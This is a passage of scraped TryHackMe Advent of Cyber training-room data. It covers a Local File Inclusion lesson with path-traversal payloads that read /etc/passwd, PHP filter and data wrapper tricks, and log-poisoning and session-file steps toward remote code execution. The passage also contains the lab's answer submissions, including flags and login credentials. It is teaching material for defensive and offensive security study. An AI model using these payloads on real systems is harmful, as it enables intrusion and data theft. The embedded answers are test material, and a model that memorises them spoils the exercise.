style=\"font-size:1rem\">using </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">..</span><span style=\"font-size:1rem\"> to get out the current directory, the number of </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">..</span><span style=\"font-size:1rem\"> is varies depending on the web app directory. </span></li><li><span style=\"font-size:1rem\">Bypassing filters using </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">....//</span>.</li><li><span style=\"font-size:1rem\">URL encoding techniques </span>(such as double encoding)</li></ul><p>You can review the topic in the <a href=\"https://tryhackme.com/room/fileinc\" target=\"_blank\">file inclusion</a> room for more information on these techniques.</p><pre style=\"font-size:14px\">  <code class=\"language-scheme\"><span style=\"font-size:10px\">http://example.thm.labs/page.php?file=/etc/passwd http://example.thm.labs/page.php?file=../../../../../../etc/passwd \nhttp://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 \nhttp://example.thm.labs/page.php?file=....//....//....//....//etc/passwd \nhttp://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd</span></code></pre><p><span style=\"font-size:1rem\">Once you have successfully viewed the content of the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/etc/passwd</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">file, you can test for other files.</span></p><p><u>Now, start the attached machine by using the green Start Machine button in this task, and apply what we discussed so far and answer the questions below.</u> In order to access the website, you can either deploy the AttackBox or visit the following website link: https://LAB_WEB_URL.p.thmlabs.com.</p><p></p><p><span style=\"font-weight:bolder;font-size:1rem\">Exploiting LFI</span><br /></p><p>Exploiting an LFI sometimes is limited and depends on the web application server configuration. Besides reading sensitive data, often, we can obtain remote code execution. <span style=\"font-size:1rem\">If we are dealing with a PHP web application, then we can use a PHP-supported Wrapper</span><span style=\"font-size:1rem\">. For more information, visit the <a href=\"https://www.php.net/manual/en/wrappers.php.php\" target=\"_blank\">PHP manual page</a>. PHP provides various methods of transmission of data (Input/Output stream) to allow PHP to read from. It will enable reading data via various data type channels.</span></p><p><span style=\"font-weight:bolder\">PHP Filter</span></p><p>The PHP filter wrapper is used in LFI to read the actual PHP page content. In typical cases, it is not possible to read a PHP file's content via LFI because PHP files get executed and never show the existing code. However, we can use the PHP filter to display the content of PHP files in other encoding formats such as <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">base64</span><span style=\"font-size:1rem\"> </span>or <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">ROT13</span>. </p><p>Let's try first reading the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/etc/passwd</span><span style=\"font-size:1rem\"> file using the PHP filter wrapper.</span></p><pre style=\"font-size:14px\">  <code class=\"language-scheme\"><span style=\"font-size:10px\">http://example.thm.labs/page.php?file=php://filter/resource=/etc/passwd</span></code></pre><p>Now try to read the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">index.php</span><span style=\"font-size:1rem\"> </span>file using a PHP filter; we get errors because the web server tries to execute the PHP code. To avoid this, we can use a PHP filter while <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">base64</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">or </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">ROT13</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">encoding the output</span><span style=\"font-size:1rem\"> as follows:</span></p><pre style=\"font-size:14px\"><code class=\"language-scheme\"><span style=\"font-size:10px\">http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd \nhttp://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd</span></code></pre><p>We will try to use base64 for our scenario. As a result, we will get <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">base64</span><span style=\"font-size:1rem\"> encoded output as follows:</span></p><pre style=\"font-size:14px\"><code class=\"language-scheme\"><span style=\"font-size:10px\">cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDox******Deleted</span></code></pre><p>To read this text as plain text, you can use a Linux terminal or use one of the websites that decodes online, for example, <a href=\"https://www.base64decode.org/\" target=\"_blank\">www.base64decode.org</a>.</p><p><u>Now, try to retrieve the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">index.php</span><span style=\"font-size:1rem\"> content, and answer question #3 below</span>.</u></p><p><span style=\"font-weight:bolder\">PHP DATA</span></p><p>The PHP wrapper is used to include raw plain text or base64 encoded data. It is used to include images on the current page. It is being used in LFI exploit. </p>Let's try to base64 encode \"AoC3 is fun!\" text to include it into the page using wrapper data:<p></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n<code class=\"language-shell-session\">user@machine$ echo \"AoC3 is fun!\" | base64 QW9DMyBpcyBmdW4hCg==</code>\n</pre></div></div><p>Also, we could decode a base64 as follows:</p><p></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n<code class=\"language-shell-session\">user@machine$ echo \"QW9DMyBpcyBmdW4hCg==\" | base64 --decode AoC3 is fun!</code>\n</pre></div></div> <br />Now we can include our base64 data into the vulnerable page as follows,<p></p><pre style=\"font-size:14px\"><code class=\"language-scheme\"><span style=\"font-size:10px\">http://example.thm.labs/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==</span></code></pre><p>As a result, the page will show our lovely message, which is <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">AoC3 is fun!</span><span style=\"font-size:1rem\">. Using this technique, we can include PHP code into a page, by encoding the required PHP code and including it into PHP data wrapper. </span><u>You can do some research to check them out!</u></p><p>Other PHP wrappers could be used in the LFI vulnerability. You can do some research to check them out!</p><p>As we mentioned before, we can gain remote command execution if we have the ability to write into a file or chain it with other vulnerability types. In this task, we will be using the vulnerable web application that we provided to perform an RCE via LFI.</p><p><span style=\"font-weight:bolder\">LFI to RCE via Log files</span></p><p>It is also called a log poisoning attack. It is a technique used to gain remote command execution on the webserver. The attacker needs to include a malicious payload into services log files such as Apache, SSH, etc. Then, the LFI vulnerability is used to request the page that includes the malicious payload. <span style=\"font-size:1rem\">Exploiting this kind of attack depends on various factors, including the design of the web application and server configurations. Thus, it requires enumerations, analysis, and an understanding of how the web application works. </span><span style=\"font-size:1rem\">For example, a user can include a malicious payload into an apache log file via User-Agent or other HTTP headers. In SSH, the user can inject a malicious payload in the username section. </span></p><p>In this task, we provided a vulnerable web application that logs users' requests into a log file to which the webserver user has access. <span style=\"font-size:1rem\">Once we log into the web application, we can visit the log page at </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">https://LAB_WEB_URL.p.thmlabs.com/logs.php</span><span style=\"font-size:1rem\">.</span></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/acd2d42ad8b11d07063767bf19dea7b2.png\" /><br /></p><p><span style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\">We can see that the log page stores four different headers, including username, IP address, </span><a target=\"_blank\" href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent\" class=\"editor-rtfLink\">User-Agent</a><span style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\">, and the visited page. </span><span style=\"color:rgb(14, 16, 26);font-size:1rem\"> </span><span style=\"color:rgb(14, 16, 26);font-size:1rem\">The </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">User-Agent</span><span style=\"font-size:1rem\"> </span><span style=\"color:rgb(14, 16, 26);font-size:1rem\">is an HTTP header that includes the user's browser information to let servers identify the type of operating system, vendor, and version. </span><span style=\"background-color:transparent;color:rgb(14, 16, 26);font-size:1rem\">The </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">User-Agent</span><span style=\"font-size:1rem\"> </span><span style=\"background-color:transparent;color:rgb(14, 16, 26);font-size:1rem\">is one of the HTTP headers that the user can control. </span><span style=\"font-size:1rem\">Therefore, </span><span style=\"font-size:1rem\">in order to get the RCE, you need to include PHP code into </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">User-Agent</span><span style=\"font-size:1rem\"> and send a request to the log file using the LFI to execute in the browser.  Now, l</span><span style=\"background-color:transparent;color:rgb(14, 16, 26);font-size:1rem\">et's test if we can include User-Agent value into the web application log file, and see if our record is recorded!</span></p><p><span style=\"background-color:transparent;color:rgb(14, 16, 26);font-size:1rem\"></span></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n<code class=\"language-shell-session\">user@machine$ curl -A \"This is testing\" http://LAB_WEB_URL.p.thmlabs.com/login.php<br /></code></pre></div></div><p></p><p><span style=\"background-color:transparent;color:rgb(14, 16, 26);font-size:1rem\">Once we send the HTTP request using curl, now using a registered user, we can check the log page to see if we can add the User-Agent that we sent.</span></p><p><span style=\"background-color:transparent;color:rgb(14, 16, 26);font-size:1rem\"></span></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/44aeb2f307650eeed2d301914af7fc2a.png\" /><br /></p>Nice! we were able to include the User-Agent value we wanted. Now, let's<span style=\"font-size:1rem\"> inject PHP code into the User-Agent using the browser, terminals, or web proxies such as Burp Suite. In this task, we will show how to include our code into the web app log using the terminal as follows,</span><p></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n<code class=\"language-shell-session\">user@machine$ curl -A \"&lt;?php phpinfo();?&gt;\" http://LAB_WEB_URL.p.thmlabs.com/login.php<br /></code></pre></div></div><p>Now using the LFI, load the log file to get the PHP code executed. Note that it is important to visit the log file via LFI. Once you call the log file, we see the PHP information page.</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/0994505c163bcea57da5e181a1fdde37.png\" style=\"width:749.247px;height:452.75px\" /><br /></p><p>Now it is practice time. We have to apply what we discussed to gain RCE. We have to include PHP code into the User-Agent and then use the LFI vulnerability called the log file to get your PHP code executed, then answer the question below.</p><p><span style=\"font-weight:bolder\">LFI to RCE via PHP Sessions</span></p><p>The LFI to RCE via PHP sessions follows the same concept of the log poisoning technique. PHP sessions are files within the operating system that store temporary information. After the user logs out of the web application, the PHP session information will be deleted.</p><p></p><p><span style=\"font-size:1rem\">This technique requires enumeration to read the PHP configuration file first, and then we know where the PHP sessions files are. Then, we include a PHP code into the session and finally call the file via LFI. </span>PHP stores session data in files within the system in different locations based on the configuration. The following are some of the common locations that the PHP stores in:</p><pre style=\"font-size:14px\">c:\\Windows\\Temp\n/tmp/\n/var/lib/php5\n/var/lib/php/session<span style=\"font-size:16px;white-space:normal\"></span></pre><p>Once the attacker finds where PHP stores the session file and can control the value of their session, the attacker can use it to a chain exploit with an LFI to gain remote command execution.<br /></p><p>If we enumerate and read the PHP configuration of the vulnerable web application we provided, we can see that it stores the PHP sessions into the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/tmp</span><span style=\"font-size:1rem\"> </span>directory. It also stores the value of the username into the session even if you are not logged in since this value is needed by the developer to use it in the logs function. We inject the PHP code into the user section in the following figure, stored in the PHP session file.</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/408f39774def8daebbfab66183e4cbe6.png\" /><br /></p><p>To find the PHP session file name, PHP, by default uses the following naming scheme, <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">sess_&lt;SESSION_ID&gt;</span><span style=\"font-size:1rem\"> </span>where we can find the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">SESSION_ID</span><span style=\"font-size:1rem\"> </span>using the browser and verifying cookies sent from the server.</p><p>To find the session ID in the browser, you can open the developer tools (SHIFT+CTRL+I), then the Application tab. From the left menu, select Cookies and select the target website. There is a <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">PHPSESSID</span><span style=\"font-size:1rem\"> </span> and the value. In my case, the value is <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">vc4567al6pq7usm2cufmilkm45</span><span style=\"font-size:1rem\">. Therefore, the file will be as </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">sess_vc4567al6pq7usm2cufmilkm45</span><span style=\"font-size:1rem\">. Finally, we know it is stored in </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/tmp</span><span style=\"font-size:1rem\">. </span><span style=\"font-size:1rem\">Now we can use the LFI to call the session file.</span></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/bb1d066f04ac72d45b45c7b6970728c5.png\" style=\"width:733.359px;height:410.81px\" /><br /></p><pre style=\"font-size:14px\"><code class=\"language-scheme\"><span style=\"font-size:10px\">https://LAB_WEB_URL.p.thmlabs.com/login.php?err=/tmp/sess_vc4567al6pq7usm2cufmilkm45</span></code></pre><p>As a result, we will have the PHP code that we injected into the username file shown on the page. Now apply what we discussed to gain RCE on the webserver using the LFI to RCE via PHP sessions. Now it is your turn to try to get RCE via PHP session.<br /><br /></p><p><span style=\"font-weight:bolder;font-size:24px\">Additional Resources</span><span style=\"font-size:24px\"><span style=\"font-weight:bolder\"><br /></span></span>If you are interested in learning more about file inclusion vulnerabilities, check out the <a href=\"https://tryhackme.com/room/fileinc\" target=\"_blank\">file inclusion room</a> on TryHackMe.<br /></p>","taskType":"vm","taskNo":11,"taskCreated":"2021-11-16T13:41:15.017Z","taskDeadline":null,"tasksInfo":[{"question":"Deploy the attached VM and look around. What is the entry point for our web application?","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"err","noAnswer":false,"answerDesc":"Answer format: ***"},{"question":"<p>Use the entry point to perform <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">LFI</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">to read the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/etc/flag</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">file. What is the flag?</span><br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{d29e08941cf7fe41df55f1a7da6c4c06}","noAnswer":false,"answerDesc":"Answer format: ***{********************************}"},{"question":"<p>Use the PHP filter technique to read the source code of the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">index.php</span>. What is the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$flag</span><span style=\"font-size:1rem\"> variable's </span>value?<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{791d43d46018a0d89361dbf60d5d9eb8}","noAnswer":false,"answerDesc":"Answer format: ***{********************************}"},{"question":"<p>McSkidy forgot his login credential. Can you help him to login in order to recover one of the server's passwords?</p><p>Now that you read the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">index.php</span><span style=\"font-size:1rem\">, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?</span></p>","hint":"username:password\n","questionNo":4,"correct":true,"extraPoints":0,"attempts":9,"submission":"McSkidy:A0C315Aw3s0m","noAnswer":false,"answerDesc":"Answer format: *******:************"},{"question":"<p>Use the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">flag.thm.aoc</span><span style=\"font-size:1rem\"> </span>server? <br /></p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{552f313b52e3c3dbf5257d8c6db7f6f1}","noAnswer":false,"answerDesc":"Answer format: ***{********************************}"},{"question":"<p>The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">./includes/logs/app_access.log</span><span style=\"font-size:1rem\">.</span><br /></p>","hint":"User-agent gets recorded in the log file, which the user has control of! Inject a PHP code into User-Agent and then use the LFI to load the page!","questionNo":6,"correct":true,"extraPoints":0,"attempts":0,"submission":"lfi-aoc-awesome-59aedca683fff9261263bb084880c965","noAnswer":false,"answerDesc":"Answer format: ************************************************"},{"question":"<p><span style=\"font-weight:bolder\">Bonus: </span>The current PHP configuration stores the PHP session files in <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/tmp</span><span style=\"font-size:1rem\">. Use the LFI to call the PHP session file to get your PHP code executed. </span><br /></p>","hint":"","questionNo":7,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"618cf66f7a509600493d4ec8","questions":[{"questionNo":1,"question":"Deploy the attached VM and look around. What is the entry point for our web application?","hint":""},{"questionNo":2,"question":"<p>Use the entry point to perform <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">LFI</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">to read the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/etc/flag</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">file. What is the flag?</span><br /></p>","hint":""},{"questionNo":3,"question":"<p>Use the PHP filter technique to read the source code of the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">index.php</span>. What is the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$flag</span><span style=\"font-size:1rem\"> variable's </span>value?<br /></p>","hint":""},{"questionNo":4,"question":"<p>McSkidy forgot his login credential. Can you help him to login in order to recover one of the server's passwords?</p><p>Now that you read the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">index.php</span><span style=\"font-size:1rem\">, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?</span></p>","hint":"username:password\n"},{"questionNo":5,"question":"<p>Use the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">flag.thm.aoc</span><span style=\"font-size:1rem\"> </span>server? <br /></p>","hint":""},{"questionNo":6,"question":"<p>The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">./includes/logs/app_access.log</span><span style=\"font-size:1rem\">.</span><br /></p>","hint":"User-agent gets recorded in the log file, which the user has control of! Inject a PHP code into User-Agent and then use the LFI to load the page!"},{"questionNo":7,"question":"<p><span style=\"font-weight:bolder\">Bonus: </span>The current PHP configuration stores the PHP session files in <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/tmp</span><span style=\"font-size:1rem\">. Use the LFI to call the PHP session file to get your PHP code executed. </span><br /></p>","hint":""}]},{"taskTitle":"[Day 7] <span class=\"badge badge-soft-danger size-16\">Web Exploitation</span> Migration Without Security","taskDesc":"<p><span class=\"notion-enable-hover\" style=\"font-style:italic\">The development team that handles gift requests from Children migrated over to a new technology stack. In doing so, they left their application vulnerable, and Grinch Enterprises now controls access to the system. Fortunately, Grinch enterprises forgot to patch the system so you can use the same vulnerability to retrieve the gift requests for the students.</span></p><h2><span style=\"font-size:24px\">Check out Tib3rius' walkthrough video for day 7 </span><a href=\"https://www.youtube.com/watch?v=Fmw8ia0sMEc\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><hr style=\"border:1px solid var(--main-color)\" /><p><span style=\"font-size:18px\"><b><u><span style=\"font-size:24px\">Please note</span></u></b><span style=\"font-size:18px\">: the video walkthrough uses the in-browser access to complete the room. The instructions in the task are slightly different and make use of the <b><u>AttackBox/OpenVPN</u></b> to </span></span><code><span style=\"font-size:18px\">ssh</span></code><span style=\"font-size:18px\"> into the target machine.</span></p><p><span style=\"font-size:18px;font-weight:bold\">Learning Objectives</span><br /></p><ul><li>What is NoSQL?</li><li>Understanding NoSQL database</li><li>Understand Why NoSQL happens</li><li>Understand what NoSQL injection is</li><li>Using 